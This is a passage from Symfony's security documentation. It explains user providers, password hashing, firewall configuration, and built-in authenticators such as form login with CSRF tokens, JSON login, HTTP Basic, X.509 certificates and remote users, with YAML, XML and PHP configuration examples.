            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <provider name="app_user_provider">
                    <entity class="App\Entity\User" property="email"/>
                </provider>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->provider('app_user_provider')
                ->entity()
                    ->class(User::class)
                    ->property('email')
            ;
        };

This user provider knows how to (re)load users from a storage (e.g. a database)
based on a "user identifier" (e.g. the user's email address or username).
The configuration above uses Doctrine to load the ``User`` entity using the
``email`` property as "user identifier".

User providers are used in a couple places during the security lifecycle:

**Load the User based on an identifier**
    During login (or any other authenticator), the provider loads the user
    based on the user identifier. Some other features, like
    :doc:`user impersonation </security/impersonating_user>` and
    :doc:`Remember Me </security/remember_me>` also use this.

**Reload the User from the session**
    At the beginning of each request, the user is loaded from the
    session (unless your firewall is ``stateless``). The provider
    "refreshes" the user (e.g. the database is queried again for fresh
    data) to make sure all user information is up to date (and if
    necessary, the user is de-authenticated/logged out if something
    changed). See :ref:`user_session_refresh` for more information about
    this process.

Symfony comes with several built-in user providers:

:ref:`Entity User Provider <security-entity-user-provider>`
    Loads users from a database using :doc:`Doctrine </doctrine>`;
:ref:`LDAP User Provider <security-ldap-user-provider>`
    Loads users from a LDAP server;
:ref:`Memory User Provider <security-memory-user-provider>`
    Loads users from a configuration file;
:ref:`Chain User Provider <security-chain-user-provider>`
    Merges two or more user providers into a new user provider.
    Since each firewall has exactly *one* user provider, you can use this
    to chain multiple providers together.

The built-in user providers cover the most common needs for applications, but you
can also create your own :ref:`custom user provider <security-custom-user-provider>`.

.. note::

    Sometimes, you need to inject the user provider in another class (e.g.
    in your custom authenticator). All user providers follow this pattern
    for their service ID: ``security.user.provider.concrete.<your-provider-name>``
    (where ``<your-provider-name>`` is the configuration key, e.g.
    ``app_user_provider``). If you only have one user provider, you can autowire
    it using the :class:`Symfony\\Component\\Security\\Core\\User\\UserProviderInterface`
    type-hint.

.. _security-encoding-user-password:

Registering the User: Hashing Passwords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Many applications require a user to log in with a password. For these
applications, the SecurityBundle provides password hashing and verification
functionality.

First, make sure your User class implements the
:class:`Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface`::

    // src/Entity/User.php

    // ...
    use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;

    class User implements UserInterface, PasswordAuthenticatedUserInterface
    {
        // ...

        /**
         * @return string the hashed password for this user
         */
        public function getPassword(): string
        {
            return $this->password;
        }
    }

Then, configure which password hasher should be used for this class. If your
``security.yaml`` file wasn't already pre-configured, then ``make:user`` should
have done this for you:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            password_hashers:
                # Use native password hasher, which auto-selects and migrates the best
                # possible hashing algorithm (which currently is "bcrypt")
                Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <!-- Use native password hasher, which auto-selects and migrates the best
                     possible hashing algorithm (currently this is "bcrypt") -->
                <password-hasher class="Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface" algorithm="auto"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;

        return static function (SecurityConfig $security): void {
            // ...

            // Use native password hasher, which auto-selects and migrates the best
            // possible hashing algorithm (currently this is "bcrypt")
            $security->passwordHasher(PasswordAuthenticatedUserInterface::class)
                ->algorithm('auto')
            ;
        };

Now that Symfony knows *how* you want to hash the passwords, you can use the
``UserPasswordHasherInterface`` service to do this before saving your users to
the database::

    // src/Controller/RegistrationController.php
    namespace App\Controller;

    // ...
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;

    class RegistrationController extends AbstractController
    {
        public function index(UserPasswordHasherInterface $passwordHasher): Response
        {
            // ... e.g. get the user data from a registration form
            $user = new User(...);
            $plaintextPassword = ...;

            // hash the password (based on the security.yaml config for the $user class)
            $hashedPassword = $passwordHasher->hashPassword(
                $user,
                $plaintextPassword
            );
            $user->setPassword($hashedPassword);

            // ...
        }
    }

.. note::

    If your user class is a Doctrine entity and you hash user passwords, the
    Doctrine repository class related to the user class must implement the
    :class:`Symfony\\Component\\Security\\Core\\User\\PasswordUpgraderInterface`.

.. tip::

    The ``make:registration-form`` maker command can help you set-up the
    registration controller and add features like email address
    verification using the `SymfonyCastsVerifyEmailBundle`_.

    .. code-block:: terminal

        $ composer require symfonycasts/verify-email-bundle
        $ php bin/console make:registration-form

You can also manually hash a password by running:

.. code-block:: terminal

    $ php bin/console security:hash-password

Read more about all available hashers and password migration in
:doc:`security/passwords`.

.. _firewalls-authentication:
.. _a-authentication-firewalls:

The Firewall
------------

The ``firewalls`` section of ``config/packages/security.yaml`` is the *most*
important section. A "firewall" is your authentication system: the firewall
defines which parts of your application are secured and *how* your users
will be able to authenticate (e.g. login form, API token, etc).

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            firewalls:
                # the order in which firewalls are defined is very important, as the
                # request will be handled by the first firewall whose pattern matches
                dev:
                    pattern: ^/(_(profiler|wdt)|css|images|js)/
                    security: false
                # a firewall with no pattern should be defined last because it will match all requests
                main:
                    lazy: true
                    # provider that you set earlier inside providers
                    provider: app_user_provider

                    # activate different ways to authenticate
                    # https://symfony.com/doc/current/security.html#firewalls-authentication

                    # https://symfony.com/doc/current/security/impersonating_user.html
                    # switch_user: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <!-- the order in which firewalls are defined is very important, as the
                     request will be handled by the first firewall whose pattern matches -->
                <firewall name="dev"
                    pattern="^/(_(profiler|wdt)|css|images|js)/"
                    security="false"/>

                <!-- a firewall with no pattern should be defined last because it will match all requests -->
                <firewall name="main"
                    lazy="true"/>

                <!-- activate different ways to authenticate
                     https://symfony.com/doc/current/security.html#firewalls-authentication -->

                <!-- https://symfony.com/doc/current/security/impersonating_user.html -->
                <!-- <switch-user/> -->
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            // the order in which firewalls are defined is very important, as the
            // request will be handled by the first firewall whose pattern matches
            $security->firewall('dev')
                ->pattern('^/(_(profiler|wdt)|css|images|js)/')
                ->security(false)
            ;

            // a firewall with no pattern should be defined last because it will match all requests
            $security->firewall('main')
                ->lazy(true)

                // activate different ways to authenticate
                // https://symfony.com/doc/current/security.html#firewalls-authentication

                // https://symfony.com/doc/current/security/impersonating_user.html
                // ->switchUser(true)
            ;
        };

Only one firewall is active on each request: Symfony uses the ``pattern`` key
to find the first match (you can also
:doc:`match by host or other things </security/firewall_restriction>`).
Here, all real URLs are handled by the ``main`` firewall (no ``pattern`` key means
it matches *all* URLs).

The ``dev`` firewall is really a fake firewall: it makes sure that you
don't accidentally block Symfony's dev tools - which live under URLs like
``/_profiler`` and ``/_wdt``.

.. tip::

    When matching several routes, instead of creating a long regex you can also
    use an array of simpler regexes to match each route:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/security.yaml
            security:
                # ...
                firewalls:
                    dev:
                        pattern:
                            - ^/_profiler/
                            - ^/_wdt/
                            - ^/css/
                            - ^/images/
                            - ^/js/
            # ...

        .. code-block:: php

            // config/packages/security.php
            use Symfony\Config\SecurityConfig;

            return static function (SecurityConfig $security): void {
                // ...
                $security->firewall('dev')
                    ->pattern([
                        '^/_profiler/',
                        '^/_wdt/',
                        '^/css/',
                        '^/images/',
                        '^/js/',
                    ])
                    ->security(false)
                ;

                // ...
            };

    This feature is not supported by the XML configuration format.

All *real* URLs are handled by the ``main`` firewall (no ``pattern`` key means
it matches *all* URLs). A firewall can have many modes of authentication,
in other words, it enables many ways to ask the question "Who are you?".

Often, the user is unknown (i.e. not logged in) when they first visit your
website. If you visit your homepage right now, you *will* have access and
you'll see that you're visiting a page behind the firewall in the toolbar:

.. image:: /_images/security/anonymous_wdt.png
   :alt: The Symfony profiler toolbar where the Security information shows "Authenticated: no" and "Firewall name: main"

Visiting a URL under a firewall doesn't necessarily require you to be authenticated
(e.g. the login form has to be accessible or some parts of your application
are public). On the other hand, all pages that you want to be *aware* of a logged in
user have to be under the same firewall. So if you want to display a *"You are logged in
as ..."* message on every page, they all have to be included in the same firewall.

You'll learn how to restrict access to URLs, controllers or
anything else within your firewall in the :ref:`access control
<security-access-control>` section.

.. tip::

    The ``lazy`` anonymous mode prevents the session from being started if
    there is no need for authorization (i.e. explicit check for a user
    privilege). This is important to keep requests cacheable (see
    :doc:`/http_cache`).

.. note::

    If you do not see the toolbar, install the :doc:`profiler </profiler>`
    with:

    .. code-block:: terminal

        $ composer require --dev symfony/profiler-pack

Fetching the Firewall Configuration for a Request
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to get the configuration of the firewall that matched a given request,
use the :class:`Symfony\\Bundle\\SecurityBundle\\Security` service::

    // src/Service/ExampleService.php
    // ...

    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\HttpFoundation\RequestStack;

    class ExampleService
    {
        public function __construct(
            // Avoid calling getFirewallConfig() in the constructor: auth may not
            // be complete yet. Instead, store the entire Security object.
            private Security $security,
            private RequestStack $requestStack,
        ) {
        }

        public function someMethod(): void
        {
            $request = $this->requestStack->getCurrentRequest();
            $firewallName = $this->security->getFirewallConfig($request)?->getName();

            // ...
        }
    }

.. _security-authenticators:

Authenticating Users
--------------------

During authentication, the system tries to find a matching user for the
visitor of the webpage. Traditionally, this was done using a login form or
a HTTP basic dialog in the browser. However, the SecurityBundle comes with
many other authenticators:

* `Form Login`_
* `JSON Login`_
* `HTTP Basic`_
* `Login Link`_
* `X.509 Client Certificates`_
* `Remote users`_
* :doc:`Custom Authenticators </security/custom_authenticator>`

.. tip::

    If your application logs users in via a third-party service such as
    Google, Facebook or Twitter (social login), check out the `HWIOAuthBundle`_
    community bundle.

.. _security-form-login:

Form Login
~~~~~~~~~~

Most websites have a login form where users authenticate using an
identifier (e.g. email address or username) and a password. This
functionality is provided by the built-in :class:`Symfony\\Component\\Security\\Http\Authenticator\\FormLoginAuthenticator`.

You can run the following command to create everything needed to add a login
form in your application:

.. code-block:: terminal

    $ php bin/console make:security:form-login

This command will create the required controller and template and it will also
update the security configuration. Alternatively, if you prefer to make these
changes manually, follow the next steps.

First, create a controller for the login form:

.. code-block:: terminal

    $ php bin/console make:controller Login

     created: src/Controller/LoginController.php
     created: templates/login/index.html.twig

.. code-block:: php

    // src/Controller/LoginController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class LoginController extends AbstractController
    {
        #[Route('/login', name: 'app_login')]
        public function index(): Response
        {
            return $this->render('login/index.html.twig', [
                'controller_name' => 'LoginController',
            ]);
        }
    }

Then, enable the ``FormLoginAuthenticator`` using the ``form_login`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login:
                        # "app_login" is the name of the route created previously
                        login_path: app_login
                        check_path: app_login

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="main">
                    <!-- "app_login" is the name of the route created previously -->
                    <form-login login-path="app_login" check-path="app_login"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $mainFirewall = $security->firewall('main');

            // "app_login" is the name of the route created previously
            $mainFirewall->formLogin()
                ->loginPath('app_login')
                ->checkPath('app_login')
            ;
        };

.. note::

    The ``login_path`` and ``check_path`` support URLs and route names (but
    cannot have mandatory wildcards - e.g. ``/login/{foo}`` where ``foo``
    has no default value).

Once enabled, the security system redirects unauthenticated visitors to the
``login_path`` when they try to access a secured place (this behavior can
be customized using :ref:`authentication entry points <security-entry-point>`).

Edit the login controller to render the login form:

.. code-block:: diff

      // ...
    + use Symfony\Component\Security\Http\Authentication\AuthenticationUtils;

      class LoginController extends AbstractController
      {
          #[Route('/login', name: 'app_login')]
    -     public function index(): Response
    +     public function index(AuthenticationUtils $authenticationUtils): Response
          {
    +         // get the login error if there is one
    +         $error = $authenticationUtils->getLastAuthenticationError();
    +
    +         // last username entered by the user
    +         $lastUsername = $authenticationUtils->getLastUsername();
    +
              return $this->render('login/index.html.twig', [
    -             'controller_name' => 'LoginController',
    +             'last_username' => $lastUsername,
    +             'error'         => $error,
              ]);
          }
      }

Don't let this controller confuse you. Its job is only to *render* the form.
The ``FormLoginAuthenticator`` will handle the form *submission* automatically.
If the user submits an invalid email or password, that authenticator will store
the error and redirect back to this controller, where we read the error (using
``AuthenticationUtils``) so that it can be displayed back to the user.

Finally, create or update the template:

.. code-block:: html+twig

    {# templates/login/index.html.twig #}
    {% extends 'base.html.twig' %}

    {# ... #}

    {% block body %}
        {% if error %}
            <div>{{ error.messageKey|trans(error.messageData, 'security') }}</div>
        {% endif %}

        <form action="{{ path('app_login') }}" method="post">
            <label for="username">Email:</label>
            <input type="text" id="username" name="_username" value="{{ last_username }}">

            <label for="password">Password:</label>
            <input type="password" id="password" name="_password">

            {# If you want to control the URL the user is redirected to on success
            <input type="hidden" name="_target_path" value="/account"> #}

            <button type="submit">login</button>
        </form>
    {% endblock %}

.. caution::

    The ``error`` variable passed into the template is an instance
    of :class:`Symfony\\Component\\Security\\Core\\Exception\\AuthenticationException`.
    It may contain sensitive information about the authentication failure.
    *Never* use ``error.message``: use the ``messageKey`` property instead,
    as shown in the example. This message is always safe to display.

The form can look like anything, but it usually follows some conventions:

* The ``<form>`` element sends a ``POST`` request to the ``app_login`` route, since
  that's what you configured as the ``check_path`` under the ``form_login`` key in
  ``security.yaml``;
* The username (or whatever your user's "identifier" is, like an email) field has
  the name ``_username`` and the password field has the name ``_password``.

.. tip::

    Actually, all of this can be configured under the ``form_login`` key. See
    :ref:`reference-security-firewall-form-login` for more details.

.. danger::

    This login form is currently not protected against CSRF attacks. Read
    :ref:`form_login-csrf` on how to protect your login form.

And that's it! When you submit the form, the security system automatically
reads the ``_username`` and ``_password`` POST parameter, loads the user via
the user provider, checks the user's credentials and either authenticates the
user or sends them back to the login form where the error can be displayed.

To review the whole process:

#. The user tries to access a resource that is protected (e.g. ``/admin``);
#. The firewall initiates the authentication process by redirecting the
   user to the login form (``/login``);
#. The ``/login`` page renders login form via the route and controller created
   in this example;
#. The user submits the login form to ``/login``;
#. The security system (i.e. the ``FormLoginAuthenticator``) intercepts the
   request, checks the user's submitted credentials, authenticates the user if
   they are correct, and sends the user back to the login form if they are not.

.. seealso::

    You can customize the responses on a successful or failed login
    attempt. See :doc:`/security/form_login`.

.. _form_login-csrf:

CSRF Protection in Login Forms
..............................

`Login CSRF attacks`_ can be prevented using the same technique of adding hidden
CSRF tokens into the login forms. The Security component already provides CSRF
protection, but you need to configure some options before using it.

First, you need to enable CSRF on the form login:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                secured_area:
                    # ...
                    form_login:
                        # ...
                        enable_csrf: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="secured_area">
                    <!-- ... -->
                    <form-login enable-csrf="true"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $mainFirewall = $security->firewall('main');
            $mainFirewall->formLogin()
                // ...
                ->enableCsrf(true)
            ;
        };

.. _csrf-login-template:

Then, use the ``csrf_token()`` function in the Twig template to generate a CSRF
token and store it as a hidden field of the form. By default, the HTML field
must be called ``_csrf_token`` and the string used to generate the value must
be ``authenticate``:

.. code-block:: html+twig

    {# templates/login/index.html.twig #}

    {# ... #}
    <form action="{{ path('app_login') }}" method="post">
        {# ... the login fields #}

        <input type="hidden" name="_csrf_token" value="{{ csrf_token('authenticate') }}">

        <button type="submit">login</button>
    </form>

After this, you have protected your login form against CSRF attacks.

.. tip::

    You can change the name of the field by setting ``csrf_parameter`` and change
    the token ID by setting  ``csrf_token_id`` in your configuration. See
    :ref:`reference-security-firewall-form-login` for more details.

.. _security-json-login:

JSON Login
~~~~~~~~~~

Some applications provide an API that is secured using tokens. These
applications may use an endpoint that provides these tokens based on a
username (or email) and password. The JSON login authenticator helps you create
this functionality.

Enable the authenticator using the ``json_login`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    json_login:
                        # api_login is a route we will create below
                        check_path: api_login

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="main">
                    <json-login check-path="api_login"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $mainFirewall = $security->firewall('main');
            $mainFirewall->jsonLogin()
                ->checkPath('api_login')
            ;
        };

.. note::

    The ``check_path`` supports URLs and route names (but cannot have
    mandatory wildcards - e.g. ``/login/{foo}`` where ``foo`` has no
    default value).

The authenticator runs when a client requests the ``check_path``. First,
create a controller for this path:

.. code-block:: terminal

    $ php bin/console make:controller --no-template ApiLogin

     created: src/Controller/ApiLoginController.php

.. code-block:: php

    // src/Controller/ApiLoginController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class ApiLoginController extends AbstractController
    {
        #[Route('/api/login', name: 'api_login')]
        public function index(): Response
        {
            return $this->json([
                'message' => 'Welcome to your new controller!',
                'path' => 'src/Controller/ApiLoginController.php',
            ]);
        }
    }

This login controller will be called after the authenticator successfully
authenticates the user. You can get the authenticated user, generate a
token (or whatever you need to return) and return the JSON response:

.. code-block:: diff

      // ...
    + use App\Entity\User;
    + use Symfony\Component\Security\Http\Attribute\CurrentUser;

      class ApiLoginController extends AbstractController
      {
    -     #[Route('/api/login', name: 'api_login')]
    +     #[Route('/api/login', name: 'api_login', methods: ['POST'])]
    -     public function index(): Response
    +     public function index(#[CurrentUser] ?User $user): Response
          {
    +         if (null === $user) {
    +             return $this->json([
    +                 'message' => 'missing credentials',
    +             ], Response::HTTP_UNAUTHORIZED);
    +         }
    +
    +         $token = ...; // somehow create an API token for $user
    +
              return $this->json([
    -             'message' => 'Welcome to your new controller!',
    -             'path' => 'src/Controller/ApiLoginController.php',
    +             'user'  => $user->getUserIdentifier(),
    +             'token' => $token,
              ]);
          }
      }

.. note::

    The ``#[CurrentUser]`` can only be used in controller arguments to
    retrieve the authenticated user. In services, you would use
    :method:`Symfony\\Bundle\\SecurityBundle\\Security::getUser`.

That's it! To summarize the process:

#. A client (e.g. the front-end) makes a *POST request* with the
   ``Content-Type: application/json`` header to ``/api/login`` with
   ``username`` (even if your identifier is actually an email) and
   ``password`` keys:

   .. code-block:: json

        {
            "username": "dunglas@example.com",
            "password": "MyPassword"
        }
#. The security system intercepts the request, checks the user's submitted
   credentials and authenticates the user. If the credentials are incorrect,
   an HTTP 401 Unauthorized JSON response is returned, otherwise your
   controller is run;
#. Your controller creates the correct response:

   .. code-block:: json

        {
            "user": "dunglas@example.com",
            "token": "45be42..."
        }

.. tip::

    The JSON request format can be configured under the ``json_login`` key.
    See :ref:`reference-security-firewall-json-login` for more details.

.. _security-http_basic:

HTTP Basic
~~~~~~~~~~

`HTTP Basic authentication`_ is a standardized HTTP authentication
framework. It asks credentials (username and password) using a dialog in
the browser and the HTTP basic authenticator of Symfony will verify these
credentials.

Add the ``http_basic`` key to your firewall to enable HTTP Basic
authentication:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    http_basic:
                        realm: Secured Area

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="main">
                    <http-basic realm="Secured Area"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $mainFirewall = $security->firewall('main');
            $mainFirewall->httpBasic()
                ->realm('Secured Area')
            ;
        };

That's it! Whenever an unauthenticated user tries to visit a protected
page, Symfony will inform the browser that it needs to start HTTP basic
authentication (using the ``WWW-Authenticate`` response header). Then, the
authenticator verifies the credentials and authenticates the user.

.. note::

    You cannot use :ref:`log out <security-logging-out>` with the HTTP
    basic authenticator. Even if you log out from Symfony, your browser
    "remembers" your credentials and will send them on every request.

Login Link
~~~~~~~~~~

Login links are a passwordless authentication mechanism. The user will
receive a short-lived link (e.g. via email) which will authenticate them to the
website.

You can learn all about this authenticator in :doc:`/security/login_link`.

Access Tokens
~~~~~~~~~~~~~

Access Tokens are often used in API contexts.
The user receives a token from an authorization server
which authenticates them.

You can learn all about this authenticator in :doc:`/security/access_token`.

X.509 Client Certificates
~~~~~~~~~~~~~~~~~~~~~~~~~

When using client certificates, your web server does all the authentication
itself. The X.509 authenticator provided by Symfony extracts the email from
the "distinguished name" (DN) of the client certificate. Then, it uses this
email as user identifier in the user provider.

First, configure your web server to enable client certificate verification
and to expose the certificate's DN to the Symfony application:

.. configuration-block::

    .. code-block:: nginx

        server {
            # ...

            ssl_client_certificate /path/to/my-custom-CA.pem;

            # enable client certificate verification
            ssl_verify_client optional;
            ssl_verify_depth 1;

            location / {
                # pass the DN as "SSL_CLIENT_S_DN" to the application
                fastcgi_param SSL_CLIENT_S_DN $ssl_client_s_dn;

                # ...
            }
        }

    .. code-block:: apache

        # ...
        SSLCACertificateFile "/path/to/my-custom-CA.pem"
        SSLVerifyClient optional
        SSLVerifyDepth 1

        # pass the DN to the application
        SSLOptions +StdEnvVars

    .. code-block:: caddy

        tls {
            client_auth {
                mode verify_if_given # check the Caddy documentation for more information
                trusted_ca_cert_file /path/to/my-custom-CA.pem
            }
        }

        route {
            # Other configuration options go here

            php_fastcgi unix//var/run/php/php-fpm.sock {
                env SSL_CLIENT_S_DN {tls_client_subject}

                # Environment variables for other certificate fields that you might need.
                # They are not used by Symfony, but you can use them in your application.
                # See all placeholders: https://caddyserver.com/docs/caddyfile/concepts#placeholders
                env SSL_CLIENT_S_FINGERPRINT {tls_client_fingerprint}
                env SSL_CLIENT_S_CERTIFICATE {tls_client_certificate_der_base64}
                env SSL_CLIENT_S_ISSUER {tls_client_issuer}
                env SSL_CLIENT_S_SERIAL {tls_client_serial}
                env SSL_CLIENT_S_VERSION {tls_version}
            }
        }

Then, enable the X.509 authenticator using ``x509`` on your firewall:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    x509:
                        provider: your_user_provider

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <x509 provider="your_user_provider"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $mainFirewall = $security->firewall('main');
            $mainFirewall->x509()
                ->provider('your_user_provider')
            ;
        };

By default, Symfony extracts the email address from the DN in two different
ways:

#. First, it tries the ``SSL_CLIENT_S_DN_Email`` server parameter, which is
   exposed by Apache;
#. If it is not set (e.g. when using Nginx), it uses ``SSL_CLIENT_S_DN`` and
   matches the value following ``emailAddress``.

You can customize the name of some parameters under the ``x509`` key.
See :ref:`the x509 configuration reference <reference-security-firewall-x509>`
for more details.

Remote Users
~~~~~~~~~~~~

Besides client certificate authentication, there are more web server
modules that pre-authenticate a user (e.g. kerberos). The remote user
authenticator provides a basic integration for these services.

These modules often expose the authenticated user in the ``REMOTE_USER``
environment variable. The remote user authenticator uses this value as the
user identifier to load the corresponding user.

Enable remote user authentication using the ``remote_user`` key:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    # ...
                    remote_user:
                        provider: your_user_provider

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <remote-user provider="your_user_provider"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $mainFirewall = $security->firewall('main');
            $mainFirewall->remoteUser()
                ->provider('your_user_provider')
            ;
        };

.. tip::

    You can customize the name of this server variable under the
    ``remote_user`` key. See
    :ref:`the configuration reference <reference-security-firewall-remote-user>`
    for more details.

.. _security-login-throttling:

Limiting Login Attempts
~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides basic protection against `brute force login attacks`_ thanks to
the :doc:`Rate Limiter component </rate_limiter>`. If you haven't used this
component in your application yet, install it before using this feature:

.. code-block:: terminal

    $ composer require symfony/rate-limiter

Then, enable this feature using the ``login_throttling`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:

            firewalls:
                # ...

                main:
                    # ...

                    # by default, the feature allows 5 login attempts per minute
                    login_throttling: null

                    # configure the maximum login attempts
                    login_throttling:
                        max_attempts: 3          # per minute ...
                        # interval: '15 minutes' # ... or in a custom period

                    # use a custom rate limiter via its service ID
                    login_throttling:
                        limiter: app.my_login_rate_limiter

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
